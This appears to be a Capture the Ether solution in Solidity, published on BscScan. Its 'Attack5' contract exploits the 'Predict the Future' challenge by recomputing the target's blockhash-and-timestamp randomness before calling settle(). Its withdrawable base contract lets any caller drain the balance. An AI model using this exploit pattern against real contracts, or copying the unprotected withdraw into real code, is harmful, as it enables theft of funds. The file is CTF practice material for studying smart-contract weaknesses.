/**
 *Submitted for verification at BscScan.com on 2022-09-03
*/

// File: CHALLENGES/contracts/libraries/withdrawable.sol

pragma solidity ^0.8.1;



contract withdrawable{



    function withdrawBalance() public {

        payable(msg.sender).transfer(address(this).balance);

    }



    function checkBalance() public view returns(uint bal, uint bal1, uint bal2){

        bal = address(this).balance;

        bal1 = bal/(10**9);

        bal2 = bal/(10**18);

    }



    receive() external payable {}

}
// File: CHALLENGES/contracts/Capture the Ether/5B.sol

pragma solidity ^0.8.1;




interface PTFC {

    function lockInGuess(uint256 n) external payable;

    function settle() external;



}



contract Attack5 is withdrawable{



    PTFC ptfc;

    uint8 public guess = 1;

    uint8 public wait;



    constructor(address payable _addr) payable{

        ptfc = PTFC(_addr);

    }



    function Attack1() public {

        ptfc.lockInGuess{value : 1 ether}(guess);

    }



    function Attack2() public{

        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;

        if (answer == guess) {

            ptfc.settle();

        }

        else wait++;

    }





}